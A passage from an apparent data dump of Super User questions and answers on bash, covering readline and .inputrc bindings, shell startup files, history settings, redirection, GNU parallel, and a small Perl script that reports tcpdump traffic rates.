              The systemwide per-interactive-shell startup file
       /etc/bash.bash.logout
              The systemwide login shell cleanup file, executed when  a  login
              shell exits
       ~/.bash_profile
              The personal initialization file, executed for login shells
       ~/.bashrc
              The individual per-interactive-shell startup file
       ~/.bash_logout
              The  individual  login shell cleanup file, executed when a login
              shell exits
       ~/.inputrc
              Individual readline initialization file
</code></pre>
"
"Tab-completion with directories/links","155167","<linux><bash><symbolic-link><autocomplete>","25","<blockquote>
<p><code>echo &quot;set mark-symlinked-directories on&quot; &gt;&gt; ~/.inputrc</code></p>
<p><kbd>Ctrl</kbd>+<kbd>x</kbd>, then <kbd>Ctrl</kbd>+<kbd>r</kbd></p>
</blockquote>
<p>via <a href=""http://bit.ly/r5xp1B"" rel=""noreferrer"">Ubuntu Forums - Strange bash shell tab completion behaviour</a></p>
"
"Why use echo before installing new software?","1165820","<linux><ubuntu><command-line><bash><echo>","25","<p>Ordinarily the function of <code>echo</code> command is to display a string (piece of text) on the console. But this time, a <code>&gt;</code> character is added after the <code>echo</code> command, redirecting its output to a text file, <code>/etc/apt/sources.list.d/ros-latest.list</code>.</p>

<p>So basically, this whole command writes a piece of text to a text file. Now, here comes the tricky part:</p>

<p>The string written to the file may be different for each computer. The part <code>$(lsb_release -sc)</code> is resolved (changed into something else) when the <code>echo</code> command runs.</p>

<p>You can open <code>/etc/apt/sources.list.d/ros-latest.list</code> in a text editor before and after the command to see the change for yourself. (The file might not exist before this command.)</p>
"
"Tmux current pane border not obvious","547883","<bash><tmux>","25","<p>This issue is resolved in the current version of tmux. When there are only two splits the upper/lower half of the split line is colored to indicate that the left/right split is active</p>

<p><img src=""https://i.stack.imgur.com/iufP5.gif"" alt=""enter image description here""></p>
"
"Bash not loading '.profile' in new session on Linux","176404","<bash><terminal><shell><bashrc><.bash-profile>","25","<p>When Bash starts as an interactive login shell, one of the files it <em>may</em> process is <code>~/.profile</code>.</p>

<p>When it starts as an interactive non-login shell it doesn't. It processes <code>/etc/bash.bashrc</code> (if that file or a similar file is enabled in your version of Bash) and  <code>~/.bashrc</code>.</p>

<p>You could add the following to your <code>~/.bashrc</code> (but be careful of loops or values being changed inadvertently):</p>

<pre><code>. $HOME/.profile
</code></pre>
"
"bash - remove all directories (and contents) but not files in pwd","713741","<linux><bash><mingw>","24","<p>No that would give you ""missing operand"" since you didn't specify anything. Putting a <code>*</code> would prompt also for files.</p>

<p>I'd give a try to:</p>

<pre><code>find -mindepth 1 -maxdepth 1 -type d -exec rm -r {} \;
</code></pre>

<p>The <code>mindepth 1</code> will exclude <code>.</code> from the results, the <code>maxdepth 1</code> will exclude trying to do under the directories that will anyway get deleted (therefore creating a warning). But in practice you could leave them both out if you agree to have a few ""innocent"" warnings.</p>
"
"Passing two arguments to a command using pipes","317819","<bash><shell-script><pipe><bash-scripting><command-line-arguments>","24","<p>I think you want 'Process Substitution' <a href=""http://tldp.org/LDP/abs/html/process-sub.html"" rel=""noreferrer"">http://tldp.org/LDP/abs/html/process-sub.html</a>.  It  also works on zsh, though it has more options and the syntax may be different.</p>

<p>It creates a pseudo file (<code>/dev/fd/something</code>) for each substitution. It's pretty useful. The command can only read as a stream, meaning it can not go back and forth with fseek. It needs to read it as a stream of bytes, like a pipe.</p>

<p>Your examples work as process substitution:</p>

<pre><code>cat &lt;(echo abc) &lt;(echo xyz)
paste -d, &lt;(cut -f2 -d, file1) &lt;(cut -f1 -d, file2)
</code></pre>

<p>Think of it as a tool to use a process and have it pretend to be a file without any temp files.</p>

<p>(from my <a href=""https://superuser.com/questions/201724/multiple-standard-input-how/201728#201728"">earlier answer</a> )</p>
"
"Escape non-printing characters in a function for a Bash prompt","301353","<bash><prompt><ansi>","24","<p>The <em>readline</em> library accepts <code>\001</code> and <code>\002</code> (ASCII <a href=""http://en.wikipedia.org/wiki/C0_and_C1_control_codes#C0_.28ASCII_and_derivatives.29"" rel=""noreferrer"">SOH and STX</a>) as non-printable text delimiters. These also work in any application that uses <em>readline</em>.</p>

<p>From <code>lib/readline/display.c:243</code> in <em>bash</em> source code:</p>

<pre><code>243 /* Current implementation:
244         \001 (^A) start non-visible characters
245         \002 (^B) end non-visible characters
246    all characters except \001 and \002 (following a \001) are copied to
247    the returned string; all characters except those between \001 and
248    \002 are assumed to be `visible'. */
</code></pre>

<p>The <em>bash</em>-specific <code>\[</code> and <code>\]</code> are in fact translated to <code>\001</code> and <code>\002</code> at <code>y.tab.c:7640</code>.</p>

<hr>

<p>Note: If you use <em>bash</em>'s <code>printf</code> or <code>echo -e</code>, and if your text has <code>\001</code> or <code>\002</code> immediately before a number, you'll hit a <em>bash</em> bug that causes it to eat one digit too many when processing octal escapes – that is, <code>\00142</code> will be interpreted as octal 014 (followed by ASCII ""2""), instead of the correct octal 01 (followed by ASCII ""42""). For this reason, use hexadecimal versions <code>\x01</code> and <code>\x02</code> instead.</p>
"
"How do I chain commands on the console?","235761","<command-line><bash>","24","<p>Use <code>&amp;&amp;</code> operator,</p>

<pre><code>cmd1 &amp;&amp; cmd2 &amp;&amp; cmd3
</code></pre>

<hr>

<p>In shellscripting, <code>&amp;&amp;</code> and <code>||</code> operators are modelled after optimized implementation of logical operators in C. <code>&amp;&amp;</code> means AND operator, and <code>||</code> means OR. Unix is tightly related to C, and in C, the second operand of logical operators isn't evaluated if the result is already known from the first operand. E.g. <code>""false &amp;&amp; x""</code> is <code>false</code> for any <code>x</code>, so there is no need to evaluate <code>x</code> (especially if <code>x</code> is a function call); similarly for <code>""true || x""</code>. This is also called <strong><a href=""http://en.wikipedia.org/wiki/Short-circuit_evaluation"" rel=""nofollow noreferrer"">short-circuiting</a> semantics</strong>.</p>

<p>And in Unix, it is traditional to interpret commands' return values as ""successful completion"" truth values: exit code 0 means <code>true</code> (success), nonzero means <code>false</code> (failure). So, when the first command in <code>cmd1 &amp;&amp; cmd2</code> returns <code>""false""</code> (nonzero exit status, which indicates failure), the compound command's status is known: failure. So overall interpretation of <code>cmd1 &amp;&amp; cmd2</code>  may be: ""execute <code>cmd1</code>, AND THEN, if it didn't fail, <code>cmd2</code>"". Which is what you basically want in your question.</p>

<p>Similarly with OR: <code>cmd1 || cmd2</code> can be interpreted as ""execute <code>cmd1</code>, OR IF it fails, <code>cmd2</code>"".</p>

<hr>

<p><em>Protip:</em> for longer chains of <code>&amp;&amp;</code>, consider putting <strong><code>set -e</code></strong> in your script. It basically changes the semicolon <code>;</code> into <code>&amp;&amp;</code>, with a couple of special cases.</p>
"
"Count of files in each sub-directories","474334","<linux><bash>","24","<p>Assuming you want a recursive count of files only, not directories and other types, something like this should work:</p>

<pre><code>find . -maxdepth 1 -mindepth 1 -type d | while read dir; do
  printf ""%-25.25s : "" ""$dir""
  find ""$dir"" -type f | wc -l
done
</code></pre>
"
"Understanding control characters in .inputrc","269464","<bash><inputrc>","24","<p>These are <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code"" rel=""nofollow noreferrer"">ANSI control-code escape sequences</a> that are transmitted when various non alphanumeric keys are pressed on a ""terminal"" keyboard.</p>

<p>\e means the ASCII ""ESCAPE"" character (octal 033 hex 1B decimal 27). Which is part of a command sequence 
introduction (CSI).</p>

<p><code>Escape [ 2 ~</code> is a character sequence transmitted when you press the key labelled ""Insert"" on a <a href=""http://en.wikipedia.org/wiki/VT220"" rel=""nofollow noreferrer"">VT220 (or later) terminal</a>.</p>

<p>Many of these conventions have been adopted in software such as xterm and Linux consoles / shells - often extended in various, sometimes incompatible ways.</p>

<p><strong>The use of these sequences in bash's READLINE function is described in the <a href=""https://en.wikipedia.org/wiki/Man_page"" rel=""nofollow noreferrer"">man pages</a> for <a href=""https://linux.die.net/man/3/readline"" rel=""nofollow noreferrer"">readline</a></strong></p>

<pre>
       In  the  second  form,  ""keyseq"":function-name or macro, keyseq differs
       from keyname above in that strings denoting an entire key sequence  may
       be  specified  by  placing the sequence within double quotes.  Some GNU
       Emacs style key escapes can be used, as in the following example,  but
       the symbolic character names are not recognized.

          ""\C-u"": universal-argument
          ""\C-x\C-r"": re-read-init-file
          ""\e[11~"": ""Function Key 1""

</pre>

<p>To get a list of which escape sequences correspond to which keyboard-keys, you can use a command such as <code>infocmp -L -1</code> or <code>infocmp -L -1 xterm</code></p>
"
"How to exit SSH of vagrant in terminal","704032","<linux><bash><ssh><vagrant>","24","<p>Assuming the <code>run</code> command stays running on the foreground, you can most probably end it with <code>CTRL+C</code>. Then the shell (and SSH) session can be terminated with <code>exit</code> or <code>CTRL+D</code>.</p>
"
"How to create a file and insert a line in it using OS X terminal","728800","<macos><command-line><bash><terminal>","24","<p><strong>Quick Answer</strong></p>

<pre><code>touch ~/.inputrc
echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p><strong>Explanation</strong></p>

<p>First, create the file:</p>

<pre><code>touch ~/.inputrc
</code></pre>

<p>Then, add the contents to the file:</p>

<pre><code>echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p><code>touch</code> creates an empty file (assuming that the <code>~/.inputrc</code> file does not already exist). <code>echo</code> writes text to the ""standard output"" (""stdout"" for short), which is normally your screen, but because of the redirection (<code>&gt;&gt;</code>), the output is redirected to <code>~/.inputrc</code>. This setup will append the line to the file.</p>

<p>If <code>~/.inputrc</code> already exists and you want to <em>erase</em> (clobber) its contents, and then write the line into it (i.e., create a file with <em>only</em> this line of text), do:</p>

<pre><code>echo ""set completion-ignore-case On"" &gt; ~/.inputrc
</code></pre>

<p>The single arrow (<code>&gt;</code>), a.k.a. ""greater than"" symbol, tells <code>echo</code> to create a file with only the given text as the contents of the file, instead of writing the contents to the end of the file. (Actually, <code>echo</code> does not create the file; the shell creates the file, discarding any existing contents, and the <code>echo</code> command writes the new contents.)</p>

<hr>

<p>If you use the first approach (with the <code>&gt;&gt;</code>) and you find that the line that you added is smushed onto the previous line, e.g.,</p>

<pre>some stuff here
some more stuff here<b>set completion-ignore-case On</b></pre>

<p>then you need to edit the file to fix it.
This would happen if the last line of the pre-existing file ended with a textual character rather than a ""newline"" character (i.e., an end-of-line marker). This is common for <code>.TXT</code> files on Windows, but rare on *nix.</p>

<p>If you somehow realize in advance that your <code>.inputrc</code> file has pre-existing contents that do not end with a newline,
then you should use this <code>echo</code> statement instead:</p>

<pre><code>echo -e ""\nset completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p>The <code>\n</code> before the phrase is interpreted as a newline character, so a newline is added after the previous contents and before the new stuff you want to add.</p>

<p>Or, slightly more typing but much more readable,</p>

<pre><code>echo """" &gt;&gt; ~/.inputrc
echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p>or</p>

<pre><code>(echo """"; echo ""set completion-ignore-case On"") &gt;&gt; ~/.inputrc
</code></pre>

<p>which do the same thing; i.e., provide the missing newline character to the existing text, and then add the <code>set completion-…</code> command after that.</p>
"
"ssh and shell through ssh : how to exit?","207453","<bash><ssh><shell-script>","24","<p>The exit in the shell script does not work because it is exiting from the script, not the shell. To exit from the shell after the script completes do</p>

<pre><code>ssh user@ipaddress '~/my_script.sh &amp;&amp; exit'
</code></pre>

<p>This will run the script then exit from the shell.</p>
"
"Equivalent of bash's `source` command in Powershell?","71446","<bash><powershell>","24","<p>You can ""<a href=""https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-6&amp;viewFallbackFrom=powershell-Microsoft.PowerShell.Core#script-scope-and-dot-sourcing"" rel=""noreferrer"">dot source</a>"" in PowerShell as well. You just need to make sure that you specify the full path. So, if the script you want to load is in the local directory you would do:</p>

<pre><code>PS C:\&gt;. .\myscript.ps1
</code></pre>
"
"Running commands in parallel with a limit of simultaneous number of commands","153630","<linux><bash><parallel-processing>","24","<p><a href=""http://www.gnu.org/software/parallel/"" rel=""noreferrer"">GNU Parallel</a> is made for this.</p>

<pre><code>seq 1 1000 | parallel -j20 do_something
</code></pre>

<p>It can even run jobs on remote computers. Here's an example for re-encoding an MP3 to OGG using server2 and local computer running 1 job per CPU core:</p>

<pre><code>parallel --trc {.}.ogg -j+0 -S server2,: \
     'mpg321 -w - {} | oggenc -q0 - -o {.}.ogg' ::: *.mp3
</code></pre>

<p>Watch an intro video to GNU Parallel here:</p>

<blockquote>
  <p><a href=""http://www.youtube.com/watch?v=OpaiGYxkSuQ"" rel=""noreferrer"">http://www.youtube.com/watch?v=OpaiGYxkSuQ</a></p>
</blockquote>
"
"how to add a day to date in bash?","45592","<bash><date>","24","<p>Just use the <code>date</code> command with <code>-d</code> option: </p>

<pre><code>$ date -d ""1983-08-04 348 days""
Tue Jul 17 00:00:00 BST 1984  
</code></pre>

<p>You can change the output format if you want:</p>

<pre><code>$ date -d ""1983-08-04 2 days"" +%Y-%m-%d
1983-08-06                                           
</code></pre>
"
"What causes bash to pause after a bad command?","394153","<bash>","24","<p>This type of behavior is caused by a tool frequently installed on some distributions that hook into bash.  This hook makes it so that if you try to run a command, and the command doesn't exist, then bash will search the files available in the configured repositories, and tell you what package you would need to install to get that command.</p>

<p>If you are not on a Debian system you'll want to look at your bash startup files profiles and so on and see if anything defines the function named <code>command_not_found_handle</code>.  If that bash function is defined, then it will be called whenever you run a command and an appropriate program cannot be found in your search path.  If you run <code>typset | less</code> and browse through the output you will see the <code>command_not_found_handle()</code> function if it has been defined.</p>

<p>On Debian/Ubuntu the package that provides this behavior is <a href=""http://packages.debian.org/sid/command-not-found"" rel=""noreferrer"">command-not-found</a>.  If you purge that, then you will disable the lookups which does slow things down.</p>

<p>Here is an example</p>

<pre><code># command-not-found installed
$ time pwgen
The program 'pwgen' is currently not installed.  To run 'pwgen' please ask your administrator to install the package 'pwgen'
pwgen: command not found

real    0m0.074s
user    0m0.032s
sys     0m0.040s

# purge command-not-found and restart bash
$ time pwgen
-bash: pwgen: command not found

real    0m0.002s
user    0m0.000s
sys     0m0.000s
</code></pre>

<p>The exact time would of course be different for you.  I ran my tests on a pretty beefy server.</p>
"
"Is there a one line command to make chmod interactive?","868379","<linux><command-line><bash>","24","<p>This does what you are looking for:</p>

<pre><code>find . -maxdepth 1 -type f -print0 | xargs -L1 -p0 chmod +x
</code></pre>

<p>This uses <code>find</code> rather than <code>ls</code> because, generally, <a href=""http://mywiki.wooledge.org/ParsingLs"" rel=""nofollow noreferrer"">parsing <code>ls</code> output is unreliable</a>.  This form, using <code>find</code>, however, will work with filenames even if they contain newlines or other difficult characters.</p>

<p>Explanation</p>

<ul>
<li><p><code>find . -maxdepth 1 -type f -print0</code></p>

<p>This selects the files.  This can be customized using any of find's many options.  The option <code>print0</code> tells <code>find</code> to print the file names in a null-separated list.  This is the only reliable to transmit lists of file names.</p></li>
<li><p><code>xargs -L1 -p0 chmod +x</code></p>

<p>This takes the null-separated list of file names generated by <code>find</code> and applies your command to them.</p></li>
</ul>

<p>The <code>-L1</code> option tells <code>xargs</code> to work on only one file name at a time.  The <code>-p</code> option tells <code>xargs</code> to prompt for approval before continuing.  The <code>-0</code> option tells <code>xargs</code> to use the null character as the delimiter between file names.</p>

<p>[I was unaware of the <code>-p</code> option to <code>xargs</code> until @kwan pointed it out.]</p>
"
"How to find the default file manager?","465495","<linux><bash><gnome><kde>","23","<p>There is no such thing as a ""Default File Manager for Linux"". It all depends how you might be trying to open one. If you ask XDG, then you'll have to check what XDG thinks this file manager should be. Same deal for any other ""environment"", such as Gnome, or KDE. If you have all of them installed, it's perfectly possible (and fine) for each of them to have a different ""default file manager"".</p>

<p>The case for default apps seems to come mainly from Windows. Over there, we only have one environment, the one Windows presents us with. As such, the notion of a default application is indeed effectively system wide. This is not the case with Linux.</p>

<p>What you might perceive as default apps under Linux, such as what is stored in the $EDITOR environment variable, is not as much a ""true"" default app, as simply a convention used by a lot of people who write system tools and scripts. Feel free to define $FILEMANAGER, if that suits your use case.</p>
"
"Is there a standard unix program that returns a range of numbers","600667","<bash><unix>","23","<p><code>seq</code> is part of coreutils.</p>

<pre><code>for i in $( seq 1 2 11 ) ; do echo $i ; done
</code></pre>

<p>Output:</p>

<pre><code>1
3
5
7
9
11
</code></pre>

<p>If you provide only 2 arguments to <code>seq</code>, the increment is 1:</p>

<pre><code>$ seq 4 9
4
5
6
7
8
9
</code></pre>
"
"Save output to a text file from Mac terminal","286911","<mac><bash><terminal>","23","<p>Simply with <a href=""http://tldp.org/LDP/abs/html/io-redirection.html"" rel=""noreferrer"">output redirection</a>:</p>

<pre><code>system_profiler &gt; file.txt
</code></pre>

<p>Basically, this will take the output of <code>system_profiler</code> and save it to the file <code>file.txt</code>. There are technically two different output ""streams"", standard output, and standard error. They are treated separately, and if you use the simple redirection method above, you will only redirect standard output to the file. If you want to redirect <em>both</em> standard output and standard error, you could do this:</p>

<pre><code>system_profiler &amp;&gt; file.txt
</code></pre>

<p>The <code>&amp;</code> tells the shell to redirect the standard output and standard error to the file.</p>

<p>If you want to <em>just</em> output standard error, you can do this:</p>

<pre><code>system_profiler 2&gt; file.txt
</code></pre>

<p>The <code>2</code> lets the shell know that it needs to only redirect standard error.</p>

<p>Using the <code>&gt;</code> will overwrite the file if it's already there. If you want to append it to a file without erasing the old one, you can use <code>&gt;&gt;</code>, like so:</p>

<pre><code>system_profiler &gt;&gt; file.txt
</code></pre>

<p>You can of course use the <code>&amp;</code> and <code>2</code> for sending both standard out and standard error, and just standard error with the <code>&gt;&gt;</code> operator.</p>
"
"Why do we have login, non-login, interactive, and non-interactive bash shells?","657848","<linux><command-line><bash><shell>","23","<p>These are my thoughts on the different ""types""of shells -- unfortunately I didn't witnessed the rise of the Un*x right from the beginning (I assume this concept is grown historically to a good extend), so please be critical.</p>

<ul>
<li>When I log into a system (nowadays via the graphical X login), there might be some tasks which should run once, e.g. establish a connection to some kind of server, present me a the today's todo list, autostart some commands, etc. This shouldn't happed every time I open up a new terminal. So there's a set of config files (<code>/etc/profile</code>, <code>~/.bash_login</code> and so on, refer to the manual for an accurate list) sourced only by <em>login</em> shells.</li>
<li>Accordingly, to close the connections, kill some programs, run a backup script there is <code>~/.bash_logout</code> when the <em>login</em> shell exists.</li>
<li>so, the ""normal"" shell I use in a terminal, shouldn't ba a <em>login</em> shell, but nevertheless should read my personal preferences from <code>~/.bashrc</code>, because I want my keybindings to interact with the shell -- hence this is an <em>interactive, non-login</em> shell.</li>
<li>and last, but not least when  bash is used for scripting, neither of this is important. <code>bash</code> should start as fast as it can, i.e. shouldn't read any config files. This is a <em>non-interactive, non-login shell</em>.</li>
</ul>

<p>So, my answer to your question <em>What would we lose if we only had one type of shell?</em> is in one word: ""Flexibility.""</p>

<hr>

<p>The answer to your second question is easy:</p>

<p><code>$-</code> lists the current set of options. These can either be set by command line parameters to <code>bash</code> or via the <code>set</code> builtin. So you have to look at two places in the manual:</p>

<ul>
<li><p><code>OPTIONS</code> section:</p>

<pre><code>-i        If the -i option is present, the shell is interactive.
</code></pre></li>
<li><p><code>SHELL BUILTIN COMMANDS</code> section, subsection <code>set</code>:</p>

<pre><code>-h      Remember the location of commands as they are looked up for execution.  This is enabled by default.
-m      Monitor  mode.  Job control is enabled.  This option is on by default for interactive shells on systems that sup‐
        port it (see JOB CONTROL above).  Background processes run in a separate process  group  and  a  line  containing
        their exit status is printed upon their completion.
-B      The shell performs brace expansion (see Brace Expansion above).  This is on by default.
-H      Enable !  style history substitution.  This option is on by default when the shell is interactive.
</code></pre></li>
</ul>
"
"Generate distribution of file sizes from the command prompt","565443","<linux><command-line><bash><unix>","23","<p>This seems to work pretty well:</p>

<pre><code>find . -type f -print0 | xargs -0 ls -l | awk '{size[int(log($5)/log(2))]++}END{for (i in size) printf(""%10d %3d\n"", 2^i, size[i])}' | sort -n
</code></pre>

<p>Its output looks like this:
<code><pre>
         0   1
         8   3
        16   2
        32   2
        64   6
       128   9
       256   9
       512   6
      1024   8
      2048   7
      4096  38
      8192  16
     16384  12
     32768   7
     65536   3
    131072   3
    262144   3
    524288   6
   2097152   2
   4194304   1
  33554432   1
 134217728   4
</pre></code>
where the number on the left is the lower limit of a range from that value to twice that value and the number on the right is the number of files in that range.</p>
"
"BASH history truncated to 500 lines on each login","575479","<linux><bash><terminal><shell><history>","23","<p>The problem actually boils down to the <a href=""https://superuser.com/a/695397/151431"">different behavior</a> of login and non-login shells. I had set the variables that control history in my <code>~/.bahsrc</code>. This file is not read when one starts a login shell, it's only read by interactive, non-login shells (from <code>man bash</code>): </p>

<blockquote>
  <p>When bash is invoked as an interactive login shell, or as a 
  non-interactive  shell with the <code>--login</code> option, it first reads
  and executes commands from the file <code>/etc/profile</code>, if that file
  exists. After reading that file, it looks for ~/.bash_profile,
  <code>~/.bash_login</code>, and <code>~/.profile</code>, in that order, and reads and
  executes commands from the first one that exists and is 
  readable. The <code>--noprofile</code> option may be used when the shell is
  started to inhibit this behavior.</p>
  
  <p>[. . . ]</p>
  
  <p>When an interactive shell that is not a login shell  is  started, 
  bash    reads  and executes commands from ~/.bashrc, if that file
  exists.  This    may be inhibited by using the --norc option.  The
  --rcfile file  option    will  force  bash  to  read  and  execute commands from file instead of    ~/.bashrc.</p>
</blockquote>

<p>Therefore, each time I logged in, or dropped to a tty, or used ssh, the <code>.history</code> file was getting truncated because I had not set it to the right size in <code>~/.profile</code> as well. I finally realized this and simply set the variables in <code>~/.profile</code> <a href=""https://unix.stackexchange.com/a/3085/22222"">where they belong</a>, instead of <code>~/.bashrc</code> </p>

<p>So, the reason my <code>~/.history</code> was getting truncated was because I had only set the HISTORY variables in a file read by interactive, non-login shells and therefore every time I ran a different type of shell the variables would be ignored and the file would be cut accordingly.</p>
"
"bash home/end/delete key is inserting a tilde, or if preceded by escape key, [1~ [3~","552863","<command-line><bash><keyboard-shortcuts><key-binding>","23","<p>You customize bash via an <code>.inputrc</code> file in your <code>/home/username</code> , you can copy the default</p>

<pre><code>cp /etc/inputrc.default   ~/.inputrc
</code></pre>

<p>here is mine (comments start with # )</p>

<pre><code># Key-bindings for the command-line editor.

# Ask before displaying &gt;50 items
# Since $WINDIR $PATH var can be in $PATH, this could list
# all window exectables in C:\WINDOWS
set completion-query-items 50

# Ignore case for the command-line-completion functionality
# on:  default to a Windows style console
# off: default to a *nix style console
set completion-ignore-case on

# none, visible or audible
set bell-style audible

# disable/enable 8bit input
set meta-flag on
set input-meta on
set output-meta off
set convert-meta on

# visible-stats
# Append a mark according to the file type in a listing
set visible-stats off
set mark-directories on

# Show all instead of beeping first
set show-all-if-ambiguous off

# MSYSTEM is emacs based
$if mode=emacs
    # Common to Console &amp; RXVT
    ""\C-?"": backward-kill-line          # Ctrl-BackSpace
    ""\e[2~"": paste-from-clipboard       # ""Ins. Key""
    ""\e[5~"": beginning-of-history       # Page up
    ""\e[6~"": end-of-history             # Page down

    $if term=msys # RXVT
        ""\e[7~"": beginning-of-line      # Home Key
        ""\e[8~"": end-of-line            # End Key
        ""\e[11~"": display-shell-version # F1
        ""\e[15~"": re-read-init-file     # F5
    #$endif
    #$if term=cygwin # Console
    $else
        ""\e[1~"": beginning-of-line      # Home Key
        ""\e[4~"": end-of-line            # End Key


""\e[3~"": delete-char            # Delete Key
#~      ""\e\e[D"": backward-word         # Alt-LeftArrow
#~      ""\e\e[C"": forward-word          # Alt-RightArrow
            ""\M-\e[D"": backward-word            # Alt-LeftArrow
            ""\M-\e[C"": forward-word         # Alt-RightArrow
    `#~`        ""\C-\E[D"": backward-word        # Ctrl-LeftArrow, nowork, can't be made to work
    #~`enter preformatted text here`        ""\C-\E[C"": forward-word         # Ctrl-RightArrow, nowork, can't be made to work
    #~ to see current bindings use    bind -q backward-kill-line
            ""\e\e"": kill-whole-line        # double/triple escape works :) Esc/Escape to delete current line like cmd.exe

        $endif
    $endif
</code></pre>

<p>to find out what you need to type in your inputrc on the left side (the escape code, as it can vary between laptop/desktop...), at the prompt type <code>echo '</code> then type <code>Ctrl-V</code> followed by the key , like <code>Home</code>, then type <code>'</code>
example</p>

<pre><code>$ echo ' home key ^[[1~  '
 home key
~
$ echo ' end key ^[[4~  '
 end key
~
$ echo ' pg up page up ^[[5~ '
 pg up page up
~
$ echo ' pg dn page down ^[[6~ '
 pg dn page down
~
</code></pre>

<p>then replace each <code>^[</code> with <code>\e</code>
add <code>\M-</code> for <code>Alt</code>
theoretically you'd use <code>\C-</code> for <code>Ctrl</code> but it currently doesn't work (windows limitation)</p>

<p>the available commands (like <code>backward-kill-line</code>) are listed in <a href=""http://www.gnu.org/software/bash/manual/bashref.html#index-backward_002dkill_002dline-_0028C_002dx-Rubout_0029"" rel=""noreferrer"">http://www.gnu.org/software/bash/manual/bashref.html#index-backward_002dkill_002dline-_0028C_002dx-Rubout_0029</a></p>

<p>you can view existing keyboard shortcuts/bindings with <code>bind -p</code> or </p>

<pre><code>$ bind -q backward-kill-word
backward-kill-word can be invoked via ""\M-\C-h"", ""\M-\C-?"".
~
$ bind -q backward-word
backward-word can be invoked via ""\M-\M-[D"", ""\M-b"", ""\C-\E[[D"".
~
$ bind -q beginning-of-line
beginning-of-line can be invoked via ""\C-a"", ""\M-OH"", ""\M-[1~"", ""\M-[H"".
~
</code></pre>

<p>don't mess with TERMCAP</p>
"
"How to get real-time network statistics in Linux with KB/MB/Bytes format and for specific port or application processID?","356907","<linux><networking><bash><monitoring><traffic>","23","<p>Your application is probably sending packets to a specific UDP or TCP port number or to a specific IP-address.</p>

<p>You can therefore use something like TCPdump to capture that traffic.</p>

<p>TCPdump doesn't give you the real-time stats you desire but you can feed it's output to something that does (I'll try to update this answer with an answer later).</p>

<hr>

<p>Update:</p>

<pre><code>$ sudo tcpdump -i eth1 -l -e -n | ./netbps
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 96 bytes
11:36:53    2143.33 Bps
11:37:03    1995.99 Bps
11:37:13    2008.35 Bps
11:37:23    1999.97 Bps
11:37:33    2083.32 Bps
131 packets captured
131 packets received by filter
0 packets dropped by kernel
</code></pre>

<p>I interrupted that after a minute by pressing Ctrl+C.</p>

<p>You'd need to add a suitable filter expression at the end of the <code>tcpdump</code> command to only include the traffic generated by your app (e.g. <code>port 123</code>)</p>

<p>The program <code>netbps</code> is this:</p>

<pre><code>#!/usr/bin/perl
use strict;
use warnings;
use Time::HiRes;

my $reporting_interval = 10.0; # seconds
my $bytes_this_interval = 0;
my $start_time = [Time::HiRes::gettimeofday()];

STDOUT-&gt;autoflush(1);

while (&lt;&gt;) {
  if (/ length (\d+):/) {
    $bytes_this_interval += $1;
    my $elapsed_seconds = Time::HiRes::tv_interval($start_time);
    if ($elapsed_seconds &gt; $reporting_interval) {
       my $bps = $bytes_this_interval / $elapsed_seconds;
       printf ""%02d:%02d:%02d %10.2f Bps\n"", (localtime())[2,1,0],$bps;
       $start_time = [Time::HiRes::gettimeofday()];
       $bytes_this_interval = 0;
    }
  }
}
</code></pre>

<p>It's just an example, adjust to taste.</p>
"
"How can I give arguments to time command (ubuntu)","112353","<ubuntu><bash><time>","23","<p>If you execute <code>time</code> then (even though <code>which time</code> will claim otherwise...) you execute the <code>time</code> command of the shell. That version does not accept <code>-v</code>. Instead, execute the proper <code>time</code> executable: <sup><a href=""https://lists.ubuntu.com/archives/ubuntu-users/2005-April/033444.html"" rel=""noreferrer"">[source]</a></sup></p>

<pre><code>$ /usr/bin/time -v sleep 4
</code></pre>

<p>That will work.</p>
"
"Retrieve Linux command line history by date","397527","<linux><command-line><bash><shell><history>","23","<p>By default, <code>History</code> logs the time when you ran a command, but doesn't display it. The reason for this is when you run the <code>History</code> command, it looks for an environment variable called <code>HISTTIMEFORMAT</code>, which tells it how to format time. If the value is <code>null</code> or not set, then by default it doesn't show any time.</p>

<p>An example with some time-</p>

<pre><code>[qweet@superbox ~]$ export HISTTIMEFORMAT='%F %t '
[qweet@superbox ~]$ history
    1  2012-03-06        su -
    2  2012-03-06        jbach@mobiletribe.net
    3  2012-03-06        mysql
    4  2012-03-06        ll
    5  2012-03-06        cd /opt/
    6  2012-03-06        ll
    7  2012-03-06        exit
    8  2012-03-06        ll
    9  2012-03-06        ls -lsa
   10  2012-03-06        cd ../
   11  2012-03-06        ll
   12  2012-03-06        ll
....
</code></pre>

<p>But that's not all. Since the <code>HISTTIMEFORMAT</code> takes <code>strftime</code> values (which you can find <a href=""http://pubs.opengroup.org/onlinepubs/009695399/functions/strftime.html"">here</a> btw), you can do all sorts of magical things. But for what you want to do, the following works.</p>

<pre><code>[qweet@superbox ~]$ export HISTTIMEFORMAT='%F %T %t'
[qweet@superbox ~]$ history | grep -e ""2012-03-06 14:48""
 1006  2012-03-06 14:48:05      export HISTTIMEFORMAT='%F %T %t'
 1007  2012-03-06 14:48:07      history
 ...
</code></pre>

<p>Also, if you want your HISTTIMEFORMAT to persist, consider appending it to your <code>bashrc</code> like so;</p>

<pre><code>echo 'HISTTIMEFORMAT=""variables here""' &gt;&gt; ~/.bashrc
</code></pre>

<p>You will see the changes when you open a new tab in the terminal, or logging out and in. </p>
"
".profile in Mac OS X?","1031","<macos><command-line><bash><.profile>","23","<p>The <code>.profile</code> file in MacOSX works exactly how you would expect.
Simply create the .profile file in your user directory if it doesn't exist.</p>
"
"Binding backward-kill-word to Ctrl+w","212446","<bash><readline>","23","<p><code>readline</code> does not bind over <kbd>Ctrl</kbd>-<kbd>W</kbd> since it is handled by the terminal driver by default:</p>

<pre><code>$ stty -a
(...) werase = ^W; (...)
</code></pre>

<p>To disable this, you have to run (in <code>~/.bashrc</code>):</p>

<pre><code>stty werase undef
bind '""\C-w"": backward-kill-word'
</code></pre>

<p><code>.inputrc</code> will not help here since it is read when <kbd>Ctrl</kbd>-<kbd>W</kbd> is still assigned to <code>werase</code>.</p>

<p>Also note that <code>\C-w</code> format keyseqs must be enclosed in double-quotes, as above.</p>

<hr>

